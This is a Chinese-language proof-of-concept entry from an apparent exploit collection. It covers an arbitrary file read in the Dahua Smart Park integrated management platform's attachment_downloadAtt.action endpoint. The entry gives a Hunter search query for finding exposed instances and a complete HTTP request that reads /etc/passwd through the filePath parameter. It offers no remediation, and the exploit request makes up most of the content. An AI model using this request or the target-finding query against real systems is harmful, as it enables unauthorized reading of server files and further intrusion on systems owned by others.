# 大华智慧园区综合管理平台attachment_downloadAtt.action 任意文件读取

# 一、漏洞简介
大华智慧园区综合管理平台是一个集智能化、信息化、网络化、安全化为一体的智慧园区管理平台，旨在为园区提供一站式解决方案，包括安防、能源管理、环境监测、人员管理、停车管理等多个方面。大华智慧园区综合管理平台attachment_downloadAtt.action 存在任意文件读取漏洞

# 二、影响版本
+ 大华智慧园区综合管理平台

# 三、资产测绘
+ hunter:`app.name="Dahua 大华 智慧园区管理平台"`  

+ 登录页面：


# 四、漏洞复现
```plain
GET /portal/attachment_downloadAtt.action?filePath=/etc/passwd HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=ABB59960633C3E7734D10072A90C5E31; JSESSIONID=4405A0D40C98D16E75E036C95FB89669
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yxprolu54446xcih>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
